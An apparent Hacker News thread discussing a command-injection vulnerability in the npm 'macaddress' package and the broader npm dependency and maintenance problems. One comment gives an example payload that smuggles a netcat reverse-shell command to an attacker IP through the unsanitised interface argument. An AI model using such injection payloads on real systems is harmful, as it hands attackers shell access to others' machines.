| [parent](#17285488) | [next](#17283944) [–]  Well said/quoted. However, the boundary is very vague. | | --- | --- | --- | | | |  |  | [wickedsight](user?id=wickedsight) [on June 11, 2018](item?id=17283944)   | [parent](#17283861) | [prev](#17283900) | [next](#17285828) [–]  In what scenarios could this be abused? | | --- | --- | --- | | | |  |  | [martinald](user?id=martinald) [on June 11, 2018](item?id=17283959)   | [root](#17283861) | [parent](#17283944) | [next](#17284119) [–]  If some user input is going into anything this library uses you can take over the box pretty much, execute anything you want (at the user level of node). Probably really hard to figure out what user input triggers that to be honest unless you have the source code of the app. This package has nearly 100M downloads a year which is pretty astonishing. | | --- | --- | --- | | | |  |  | [wickedsight](user?id=wickedsight) [on June 11, 2018](item?id=17284656)   | [root](#17283861) | [parent](#17283959) | [next](#17284119) [–]  I get that part, but in what scenario will user input actually be provided to this package? It feels like this is highly unlikely and that there probably won't be any cases where this will actually be an issue. I may be wrong though, I just can't think of anything. | | --- | --- | --- | | | |  |  | [martinald](user?id=martinald) [on June 11, 2018](item?id=17289115)   | [root](#17283861) | [parent](#17284656) | [next](#17284119) [–]  An example off the top of my head would be some sort of IoT device which has a drop-down to communicate via 4G, WiFi, ethernet etc. I'd be they'd put the value of the select to be the interface name and wouldn't check input value, so you could craft a special request with a bad value. But I do agree; not super easy to exploit. The more worrying fact is something like this which could easily be drawn in to 100m installs. | | --- | --- | --- | | | |  |  | [parenthephobia](user?id=parenthephobia) [on June 11, 2018](item?id=17284119)   | [root](#17283861) | [parent](#17283944) | [prev](#17283959) | [next](#17285828) [–]  Anything which passes "iface" through without sanitising it. The argument to exec is executed in a shell, so it can execute just about anything it likes, such as dialing out to a host under the attacker's control and giving it direct shell access. e.g. ```     macaddress.one(";nc 1.2.3.4 4444 –e /bin/sh;", () => {}) ``` | | --- | --- | --- | | | |  |  | [deelowe](user?id=deelowe) [on June 11, 2018](item?id=17285824)   | [root](#17283861) | [parent](#17284119) | [next](#17285828) [–]  I think the OP was trying to imagine a scenario where a potentially malicious user would be asked to pass in the interface string. | | --- | --- | --- | | | |  |  | [duxup](user?id=duxup) [on June 11, 2018](item?id=17285828)   | [parent](#17283861) | [prev](#17283944) | [next](#17294619) [–]  I'm admittedly a n00b here. Is operating exec with any kind of unverified user provided data inherently dangerous? | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 11, 2018](item?id=17285911)   | [root](#17283861) | [parent](#17285828) | [next](#17285845) [–]  Me too... with figuring out security with exec at least. Yes is the answer, and this is noted in the nodejs documentation for exec. The difficulty seems to be that there is no generic pattern for making it safe with exec, it's contextual. Preventing exploits requires you to consider which shell, which command and which part of that combination is being exposed to your user input for you to know exactly what must be sanitised from your user input if you want anything more than alphanumerics. I suggested one simpler safe pattern lower down in this thread which is encapsulating user based parameters in single quotes (which requires only sanitising against single quotes). Although this is safe, others have noted valid arguments against this too. It seems like it's just best avoided unless absolutely necessary (most often it's not). | | --- | --- | --- | | | |  |  | [sli](user?id=sli) [on June 11, 2018](item?id=17285845)   | [root](#17283861) | [parent](#17285828) | [prev](#17285911) | [next](#17294619) [–]  Yes. You will simply never catch every possible case that can potentially cause harm. | | --- | --- | --- | | | |  |  | [duxup](user?id=duxup) [on June 11, 2018](item?id=17286072)   | [root](#17283861) | [parent](#17285845) | [next](#17294619) [–]  Thank you. That's what I'm assuming. Just arbitrarily executing an unknown seems bad at face value. | | --- | --- | --- | | | |  |  | [danmg](user?id=danmg) [on June 12, 2018](item?id=17294619)   | [parent](#17283861) | [prev](#17285828) | [next](#17285180) [–]  Also this interface assumes that the kernel is using sysfs. | | --- | --- | --- | | | |  |  | [rms\_returns](user?id=rms_returns) [on June 11, 2018](item?id=17285180)   | [parent](#17283861) | [prev](#17294619) | [next](#17284430) [–]  There is no dearth of amateurish shenanigans in node infrastructure, there is a reason that people are still reluctant to switch from php/python despite so many selling points of node. | | --- | --- | --- | | | |  |  | [megous](user?id=megous) [on June 11, 2018](item?id=17285225)   | [root](#17283861) | [parent](#17285180) | [next](#17284430) [–]  These kinds of bugs are language independent, the source is between the screen and the keyboard. | | --- | --- | --- | | | |  |  | [grumdan](user?id=grumdan) [on June 11, 2018](item?id=17285443)   | [root](#17283861) | [parent](#17285225) | [next](#17285350) [–]  They are language-independent but may still have a higher incidence in one community than another. Anecdotally, these basic mistakes seem to happen more in Node packages or JS-based projects, but I have no concrete evidence for this speculation. The only study I know of looking at this in a serious way is this one: <http://web.cs.ucdavis.edu/~filkov/papers/lang_github.pdf> (<https://news.ycombinator.com/item?id=8558740>) However, JavaScript ends up a being less prone to defective commits than C++ and C, as well as PHP and Python, but there are a number of issues that don't allow us to conclude all that much from these results (imo). | | --- | --- | --- | | | |  |  | [staticassertion](user?id=staticassertion) [on June 11, 2018](item?id=17285781)   | [root](#17283861) | [parent](#17285443) | [next](#17285350) [–]  > Anecdotally, these basic mistakes seem to happen more in Node packages or JS-based projects It's just bias. Python code is riddled with vulns - especially since it's all C under the hood. [https://hackernoon.com/python-sandbox-escape-via-a-memory-co...](https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5) Here's a great post that covers some issues in Python modules and why they're *extra* exploitable because they execute under CPython. This is a particularly relevant quote: > Perhaps less recognized is the fact that memory corruption bugs are reported in popular Python modules all the time without so much as a CVE, a security advisory, or even a mention of security fixes in release notes. | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [on June 11, 2018](item?id=17285350)   | [root](#17283861) | [parent](#17285225) | [prev](#17285443) | [next](#17284430) [–]  The "amateurish shenanigans" alluded to probably has nothing to do with the language but the project itself. If anyone can commit anything and nobody ever reads what is to be commited, the repository must be regarded as attacker controlled. Some people will likely find that problematic. | | --- | --- | --- | | | |  |  | [georgyo](user?id=georgyo) [on June 11, 2018](item?id=17284430)   | [prev](#17283861) | [next](#17284279) [–]  Many people here are saying that the problem had been in the code base for years, was super obvious, and that just no one looked at the code. I think that it is much more relevant that the node community does do many micro packages, that it makes so much nose to look at the quality of pulled in packages. I recently pulled down a web app (Zulip) the packages.json expands to almost 1400 npm packages. How is any human going to look at all that. And apparently it is "normal" for an npm project to have that many dependencies. Too me this is madness. It is impossible to know the quality of all those packages. | | --- | --- | --- | | | |  |  | [pi-squared](user?id=pi-squared) [on June 11, 2018](item?id=17284626)   | [parent](#17284430) | [next](#17285301) [–]  I am not a fan of the whole javascript craze but for comparison on my desktop machine with I assume average setup of ElementaryOS: ```     $ apt list --installed | wc -l      2394  ``` And on my server the number is 502. Couldn't the same argument be applied here as well? I understand that (probably) users of Ubuntu are more involved than supporting npm packages (or... are they) but it's still a lot of packages to eyeball. | | --- | --- | --- | | | |  |  | [cyphar](user?id=cyphar) [on June 11, 2018](item?id=17285522)   | [root](#17284430) | [parent](#17284626) | [next](#17284754) [–]  That is for *everything* required to run an *entire* operating system. You're actually putting Node's micro-package madness into even more of a negative light from this comparison -- if it takes only several hundred packages to run an entire distribution, why is it reasonable to require that many packages to run a single web application (not to mention that most distribution packages don't depend on hundreds of others)? The difference is that the only people looking into NPM packages are the Node community. The entire Linux community -- which includes a large portion of the Node community mind you -- looks into the set of packages you are looking at (yes, we've had a bad rap in recent years -- but in our defence we really are trying). I'm a little biased with regards to distributions (I work for SUSE), but I like to think that working on a distribution has given me a much better understanding of how much work goes into those packages. I don't think you could adequately replicate most of that engineering in the time that most micro-package ecosystems have been around. | | --- | --- | --- | | | |  |  | [georgyo](user?id=georgyo) [on June 11, 2018](item?id=17284754)   | [root](#17284430) | [parent](#17284626) | [prev](#17285522) | [next](#17284768) [–]  Sure, but the major difference is that those packages are for everything on your system. Dependencies are often added very carefully. In the node case it is not uncommon for a small app to include 50 small packages, and then those packages pulled in 30 unique smaller packages each (on average). Imagine you did an apt upgrade on your system, or decided to install a new package and it said it was going to install 1500 new packages. Would you continue? It would definitely make me pause for a while. But this is the norm in the node world, and people seem to think it is a good idea. | | --- | --- | --- | | | |  |  | [throwaway5752](user?id=throwaway5752) [on June 11, 2018](item?id=17284768)   | [root](#17284430) | [parent](#17284626) | [prev](#17284754) | [next](#17285315) [–]  I think that's the point. Outside of very few operating systems and languages with the organization and history supporting them, there's not much that one *should* trust. Since you can't validate every package yourself, you have to ask yourself if you trust your counterparty. Do you trust ElementaryOS to do have dozens of people validating upstreams before pulling into stable and correctly doing proper package source integrity steps like Red Hat, Canonical, SUSE, et al do? I know they are Ubuntu LTS based but what are the additional packages and how carefully are they curated, built, and stored? May the answer is to not use Node or ElementaryOS depending on how important security is to you. May I'm the weirdo for critically inspecting 3rd party libraries before including them and looking at the transitive dependencies they pull along. | | --- | --- | --- | | | |  |  | [megous](user?id=megous) [on June 11, 2018](item?id=17285315)   | [root](#17284430) | [parent](#17284626) | [prev](#17284768) | [next](#17284740) [–]  The trust model of linux distro is different from NPM. Dependning on the distro, there may be many maintainers who are separate from upstream developers. These maintainers may manage 5-10 pcakages on average and usually keep tabs on the upstream. There's just no equivalent of maintainers in the NPM land. | | --- | --- | --- | | | |  |  | [JoshTriplett](user?id=JoshTriplett) [on June 11, 2018](item?id=17284740)   | [root](#17284430) | [parent](#17284626) | [prev](#17285315) | [next](#17285301) [–]  Not the same thing. Your desktop install might include a few thousand packages *total*, but that doesn't mean any significant number of packages pull in a thousand dependencies by themselves. Node packages might consist of a single function. | | --- | --- | --- | | | |  |  | [bunderbunder](user?id=bunderbunder) [on June 11, 2018](item?id=17285301)   | [parent](#17284430) | [prev](#17284626) | [next](#17285867) [–]  I'm starting to wonder if this is just a fundamental weakness of open source software. Compare with a commercial platform, such as .NET or Cocoa - there you've got more "batteries included" libraries, with relatively large, standardized packages that have short dependency trees, being maintained by people who are *paid* to pay attention to these sorts of details. This isn't to say that commercial software is bug-free - far from it. If something passes code review, it's not going to be looked at again until someone's being paid to look at it again. Which gets you to a similar place as with open source: Software is buggy. Mostly, though, it leaves me thinking that the whole ideal of, "It's open source, so you can assume many eyes are looking at it," is a pipe dream. Probably the bystander effect is closer to the truth: If it's a small project, I'm relatively likely to at least cursorily look over the code before taking a dependency on it. If it's a big project, though, I just assume someone else is doing that. Just like everyone else. If it's a big project taking dependencies on small projects, though, that seems to be the worst situation. Nobody can make sense of that. | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [on June 11, 2018](item?id=17286812)   | [root](#17284430) | [parent](#17285301) | [next](#17285867) [–]  Look inside that "commercial" software of yours, chances are that it bundles both five crappy js libs but also a vulnerable version of gzip. Large parts of the code of any non-trivial software package will be open source code. There are literally people who makes their living from pointing these things out. Unless your software is among the absolutely most widespread, chances are it's not audited *at* *all*. (Also, can we please leave the perceived distinction between "commercial" and "open source" in the 90s where it belongs?) | | --- | --- | --- | | | |  |  | [jmull](user?id=jmull) [on June 11, 2018](item?id=17285867)   | [parent](#17284430) | [prev](#17285301) | [next](#17284279) [–]  I think it’s a misapprehension to focus on the granularity of release items (packages). Why should that especially influence the security (or other variables of quality) of the underlying source? If a given app includes 1400 pieces of code, does it matter that you can discern all 1400 externally vs if all 1400 are bundled into a single package? However it’s bundled, there’s code beneath for it all, all with the same potential problems. All of it with the same need to be reviewed and/or trusted. If anything, the transparency may help. It’s certainly hard for me to see why it hurts. | | --- | --- | --- | | | |  |  | [jedisct1](user?id=jedisct1) [on June 11, 2018](item?id=17284279)   | [prev](#17284430) | [next](#17283879) [–]  npmjs shows 1,325,674 weekly downloads. The current version was released 3 years ago. The code is small and straightforward. Using exec("cat x " + userdata) to read a file in any language should immediately drive any developer nuts. Apparently, nobody ever looked at the code. Or maybe some people did, but never reported it. Pretty sure some companies did, fixed it in their closed local fork and never notified the author nor contributed their fix back. This is really scary, and really bad for the trustworthiness of open-source software. | | --- | --- | --- | | | |  |  | [robin\_reala](user?id=robin_reala) [on June 11, 2018](item?id=17283879)   | [prev](#17284279) | [next](#17283883) [–]  This has been biting a lot of people as the mostly unmaintained cssnano uses it, which in turn is used by create-react-app. Previously this would have probably gone unnoticed, but npm audit in npm6 has brought it front and centre. | | --- | --- | --- | | | |  |  | [bpicolo](user?id=bpicolo) [on June 11, 2018](item?id=17283980)   | [parent](#17283879) | [next](#17283921) [–]  > biting a lot of people In what sense? I doubt there are many apps (if any) out there that actually have a vulnerability here, because it's unlikely that a web app out there is going to be passing random user input to a mac address package. | | --- | --- | --- | | | |  |  | [evan\_](user?id=evan_) [on June 11, 2018](item?id=17284132)   | [root](#17283879) | [parent](#17283980) | [next](#17283921) [–]  Add to that that cssnano is unlikely to even be present in deployed code, it’s a build tool. | | --- | --- | --- | | | |  |  | [bpicolo](user?id=bpicolo) [on June 11, 2018](item?id=17284159)   | [root](#17283879) | [parent](#17284132) | [next](#17283921) [–]  cssnano doesn't even use the package directly, doubt you could find a path where it passes any cssnano calls down to it | | --- | --- | --- | | | |  |  | [andyana](user?id=andyana) [on June 11, 2018](item?id=17283921)   | [parent](#17283879) | [prev](#17283980) | [next](#17283883) [–]  It's amazing that something like cssnano would have a dependency on getting MAC addresses. WTF? | | --- | --- | --- | | | |  |  | [roblabla](user?id=roblabla) [on June 11, 2018](item?id=17284095)   | [root](#17283879) | [parent](#17283921) | [next](#17283945) [–]  I maintain a package that has an indirect dep to macaddress because of UUID generation. UUID v2 is generated from Mac address + timestamp. My package only generates uuid v4 (fully random) and even if it was, the uuid dep doesn't expose the vulnerable argument. As such it isn't vulnerable. But the dep is still there. This isn't surprising at all tbh. | | --- | --- | --- | | | |  |  | [bluetech](user?id=bluetech) [on June 11, 2018](item?id=17284434)   | [root](#17283879) | [parent](#17284095) | [next](#17283945) [–]  A dependency for uuid4 is hardly needed: ```   crypto = require('crypto');    function uuid4() {       const bytes = crypto.randomBytes(16);       bytes[6] = (bytes[6] & 0x0f) | 0x40;       bytes[8] = (bytes[8] & 0x3f) | 0x80;       return bytes.toString('hex').match(/(.{8})(.{4})(.{4})(.{4})(.{12})/).slice(1).join('-');   } ``` | | --- | --- | --- | | | |  |  | [roblabla](user?id=roblabla) [on June 11, 2018](item?id=17285330)   | [root](#17283879) | [parent](#17284434) | [next](#17284659) [–]  I mean sure. But I also need to parse UUID. And do other things with it. Even if I didn't need to, I'd still likely use the uuid-1345 crate for it. Here's the thing: If I import this code in my codebase directly instead of using a library, it suddenly becomes my "responsibility" if it breaks. And when we're talking about a FOSS side-project, I don't have that kind of time. Third-party libraries means I get any improvements and bug-fixes for free. And if it breaks, I get to talk with the original maintainer to figure it out, and we're suddenly two people, with one hopefully knowledgable enough on the topic, working on the problem. Importing this kind of thing in make codebase makes it an ugly unwieldy mess that *will* inevitably break, and I suddenly will be alone trying to figure out what I did wrong. This is what's good about npm and libraries: the community that's built around it. | | --- | --- | --- | | | |  |  | [bluetech](user?id=bluetech) [on June 11, 2018](item?id=17287804)   | [root](#17283879) | [parent](#17285330) | [next](#17284659) [–]  Well, surely you put the line somewhere? Would you depend on `leftpad`? How about `is-odd`? Your view of dependencies is very idealistic. And if I'd venture to guess - apologies if I'm wrong - young, at least to programming. I'm saying this because you don't tend to hear such phrases once reality hits. Everything you said can be flipped: > If I import this code in my codebase directly instead of using a library, it suddenly becomes my "responsibility" if it breaks. I have full control & understanding of the code; I can adjust & trim so it fits as much as possible. If it breaks, I can fix it directly. > And when we're talking about a FOSS side-project, I don't have that kind of time. Copying/hand rolling some trivial code is often faster than deciding among a dozen libraries which do the same thing, reading their docs, their issue pages and open PRs, adding and integrating to my project. > Third-party libraries means I get any improvements and bug-fixes for free. I must keep the dependencies updated. I must read changelogs and hope nothing breaks. > And if it breaks, I get to talk with the original maintainer to figure it out I must use inefficient communication with a more-often-than-not absent maintainer in order to resolve my problem instead of fixing it directly. > I suddenly will be alone trying to figure out what I did wrong I am able to be self-reliant in fixing the problem, because I wrote the code and I understand it. I do not have to trust the maintainer of the package or the maintainers of any of its transitive dependencies to be competent or non-evil. --- For some things this is worth it. IMO for generating 16 random bytes it is not worth it. | | --- | --- | --- | | | |  |  | [roblabla](user?id=roblabla) [on June 15, 2018](item?id=17316608)   | [root](#17283879) | [parent](#17287804) | [next](#17284659) [–]  Well, everything I've said here are grounded in personal experience working on FOSS projects. They're also grounded in trust of the maintainers. In 5 years of full-time programming as a job and a hobby, I have found that to work to my advantage. I can understand that this might not be everyone's experience. I also understand that different projects have different needs - some might simply be too sensitive to depend on external code if they can help it. To answer your rhetorical questions: I would certainly depend on leftpad, as it allows me to free my mind to something more useful. I probably wouldn't depend about is-odd because I intuitively know how to make it work. That's pretty personal. The line is basically drawn at "do I need to think to figure this out." Yes, leftpad is trivial. But this is death by the thousand papercuts: When I program something, I'm solving a problem. Having to solve a million other problems at the same time - no matter how trivial - is going to take me away from what I'm supposed to actually doing. It breaks my flow. I don't like that. > Copying/hand rolling some trivial code is often faster than deciding among a dozen libraries which do the same thing, reading their docs, their issue pages and open PRs, adding and integrating to my project. I have found this to not be the case. In the JS land, depending on a library is beyond trivial. Especially for those "simple" libraries that simply export a function. Yes, I do need to read the docs, but there isn't a million ways to do leftpadding, nor is there a million ways to do UUID generation. Copy pasting code might require playing with requires, figuring out transitive dependencies, and just some manual work that take time away from actually thinking about the code I'm working on - again, breaking my flow, forcing me to context switch. > I must keep the dependencies updated. I must read changelogs and hope nothing breaks. Semver takes care of that for you. And yes, I trust maintainers to follow semver. Again, that generally works. I only had a single case of semver-breaking release in my life, and that was in the Rust land - docopt.rs 0.8.2. <https://github.com/docopt/docopt.rs/issues/235>. Debugging the issue took me at most an hour, reporting it to upstream took seconds, and the fixed version was released literally 10 minutes later. In the meantime, my install still worked due to the lockfile pinning the previous docopt version. I could easily continue working normally. Breakage happen. I've found that breakage also happen internally. Sometimes I change my code and break my own invariants. Refactor and forget to fix an instance, which breaks the code in subtle ways. Bugs happen. I accept that. > I have full control & understanding of the code; I can adjust & trim so it fits as much as possible. If it breaks, I can fix it directly. This is where I totally disagree. Depending on a third-party package does not deprive me of the ability to fix code when it breaks. And in fact: it empowers me. Again, the major advantage of dependencies, in my view, comes from the community. And if it needs adjustment that could be beneficial to others, I can PR it. I can fork, and npm has tools to make it easy to inject a fork into the dependency tree, replacing all instances with my own. This lets me experiment with potential fixes with ease, as if it was my own code. Sure, sometimes, the library might not do exactly what I want it to, exactly how I want it to. Maybe what I want to do is incompatible with said libraries. In those cases, rolling my own might make sense. In the end, it comes down to this: I trust the community, and believe in taking and giving back. If that's a young point of view, then so be it. Maybe I'll learn the hard way that reality is not so forgiving, that my trust was misplaced. | | --- | --- | --- | | | |  |  | [\_wmd](user?id=_wmd) [on June 11, 2018](item?id=17284659)   | [root](#17283879) | [parent](#17284434) | [prev](#17285330) | [next](#17283945) [–]  v1 and v2 UUIDs are derived from a MAC address by specification, the uniqueness of the v1 scheme in particular depends on it. Whether that's a good idea or not is another topic entirely, but if you want to conform to spec, an implementation needs to be able to read MAC addresses | | --- | --- | --- | | | |  |  | [bluetech](user?id=bluetech) [on June 11, 2018](item?id=17284962)   | [root](#17283879) | [parent](#17284659) | [next](#17283945) [–]  Please see the comment I replied to. | | --- | --- | --- | | | |  |  | [zajd](user?id=zajd) [on June 11, 2018](item?id=17283945)   | [root](#17283879) | [parent](#17283921) | [prev](#17284095) | [next](#17283883) [–]  npm was a mistake | | --- | --- | --- | | | |  |  | [always\_good](user?id=always_good) [on June 11, 2018](item?id=17284184)   | [root](#17283879) | [parent](#17283945) | [next](#17283883) [–]  NPM doesn't change anything here. the same issue would exist if you could only vendor dependencies. Are you sure you understand the issue? | | --- | --- | --- | | | |  |  | [mrwilhelm](user?id=mrwilhelm) [on June 11, 2018](item?id=17284420)   | [root](#17283879) | [parent](#17284184) | [next](#17284239) [–]  Programming was a mistake. | | --- | --- | --- | | | |  |  | [tzahola](user?id=tzahola) [on June 11, 2018](item?id=17284239)   | [root](#17283879) | [parent](#17284184) | [prev](#17284420) | [next](#17283883) [–]  Javascript was a mistake Edit: Answer to “always\_good”: If a toddler shoots himself with a handgun, we can say that his mistake was pulling the trigger. While technically correct, it’s not addressing the real issue, that is, how did the toddler get hold of the gun in the first place? | | --- | --- | --- | | | |  |  | [always\_good](user?id=always_good) [on June 11, 2018](item?id=17284302)   | [root](#17283879) | [parent](#17284239) | [next](#17287200) [–]  Wrong again. Passing user input into arbitrary shell commands is the mistake. Good examples of amateur criticism that plagues our field, though. | | --- | --- | --- | | | |  |  | [scrollaway](user?id=scrollaway) [on June 11, 2018](item?id=17287200)   | [root](#17283879) | [parent](#17284239) | [prev](#17284302) | [next](#17284456) [–]  This isn't a case of JS gun gone wrong. Someone's passing cat inside exec with an arbitrary path instead of using native open&read and path.join. That's a thing possible in almost every modern language. Stop the nonsense. Seriously. Stop. | | --- | --- | --- | | | |  |  | [supermdguy](user?id=supermdguy) [on June 11, 2018](item?id=17284456)   | [root](#17283879) | [parent](#17284239) | [prev](#17287200) | [next](#17283883) [–]  Having the ability to execute arbitrary commands isn't something that's unique to JavaScript. | | --- | --- | --- | | | |  |  | [speps](user?id=speps) [on June 11, 2018](item?id=17283883)   | [prev](#17283879) | [next](#17290214) [–]  The actual report, as that page contains nothing interesting: <https://hackerone.com/reports/319467> | | --- | --- | --- | | | |  |  | [cyphar](user?id=cyphar) [on June 12, 2018](item?id=17290214)   | [prev](#17283883) | [next](#17285166) [–]  According to the HackerOne report[1] there was no response from the maintainer and the last package update was 3 years ago. And yet the package is downloaded several *million* times a month (meaning it's definitely used in something -- I imagine looking at the reverse dependency tree would cause some concern). This is something that bothers me a lot with most of these home-grown package ecosystems. In distributions we remove packages from their main repositories if old maintainers are no longer available and nobody is interested in becoming the new maintainer (we do this in openSUSE all the time). Does the Node (and Rust, Python, Ruby, ...) community have this sort of process for deciding that a project is no longer adequately maintained? One of the benefits of having macro-packages is that it's always clear whether a package is being maintained -- if there isn't a release for a long time then it's probably no longer maintained. But with micro-packages there are thousands which are so trivial they require no updates (see left-pad, ansi-{green,blue,red,yellow,cyan,...}, and so on) that a very large number of projects depend on. Not to mention that distributions don't generally have projects with thousands of dependencies each -- so removing a dependency and everything that depends on it will not destroy the entire package ecosystem. [1]: <https://hackerone.com/reports/319467> | | --- | --- | --- | | | |  |  | [sagacity](user?id=sagacity) [on June 11, 2018](item?id=17285166)   | [prev](#17290214) | [next](#17284473) [–]  That yet another NPM package proves to be pretty broken seems to be par for the course, but what especially shocks me is that on Hackerone the people working on this vulnerability can't reach the original maintainer and then say: "Doesn't look epic to me, also last publish was 3 years ago." It doesn't look epic, yet it's a package that has over 1.2 million weekly downloads. Also, fun fact, one of the dependent packages is react-input-select...WHY? | | --- | --- | --- | | | |  |  | [wolfgang42](user?id=wolfgang42) [on June 11, 2018](item?id=17286398)   | [parent](#17285166) | [next](#17285372) [–]  react-input-select has 640 (!) dependencies, all of which were added by the author in a commit named 'type fix'[1] which seems to have been ostensibly intended to fix a typo, and none of which seem to be required to actually use the library. The only thing I can imagine is that the author somehow added their entire node\_modules tree as dependencies. Maybe it was an ill-fated attempt at pinning? [1]: [https://github.com/rayescmata/react-input-select/commit/cd7b...](https://github.com/rayescmata/react-input-select/commit/cd7b82578d70b9562013e00eb1ee7594ef628e9d) | | --- | --- | --- | | | |  |  | [00oo00](user?id=00oo00) [on June 11, 2018](item?id=17285372)   | [parent](#17285166) | [prev](#17286398) | [next](#17284473) [–]  Checkout react-input-select's package.json... It's just full of unrelated random dependencies. Might be some way to advertise his node package? | | --- | --- | --- | | | |  |  | [taf2](user?id=taf2) [on June 11, 2018](item?id=17284473)   | [prev](#17285166) | [next](#17284544) [–]  love those little bobby tables | | --- | --- | --- | | | |  |  | [cc-d](user?id=cc-d) [on June 11, 2018](item?id=17284544)   | [prev](#17284473) | [next](#17284990) [–]  Another month, another ridiculous issue involving NPM that has no place being in software with millions of weekly downloads. It really is never ending amateur hour in the NPM community. | | --- | --- | --- | | | |  |  | [binarymax](user?id=binarymax) [on June 11, 2018](item?id=17284603)   | [parent](#17284544) | [next](#17284990) [–]  This has nothing to do with NPM. It is a specific package published on NPM. Also, stereotyping and insulting the NPM community is nonconstructive and out of place. Vulnerabilities in packages happen all the time in all kinds of package managers. The lesson here is to not blind-trust any package you come across that might make your job easier. | | --- | --- | --- | | | |  |  | [ashelmire](user?id=ashelmire) [on June 11, 2018](item?id=17284990)   | [prev](#17284544) [–]  This one has been out for about a month: [https://snyk.io/vuln/npm:macaddress:20180511](https://snyk.io/vuln/npm%3Amacaddress%3A20180511) Unfortunately, it's introduced into any Rails app that uses webpacker or any app using node-sass through a long dependency chain. And once again demonstrates how the JS community is far too dependent on extremely trivial, unsupported, and unaudited libraries. | | --- | --- | --- | | |
| |  | | --- |   [Consider applying for YC's Spring batch! Applications are open till Feb 11.](https://www.ycombinator.com/apply/) [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |


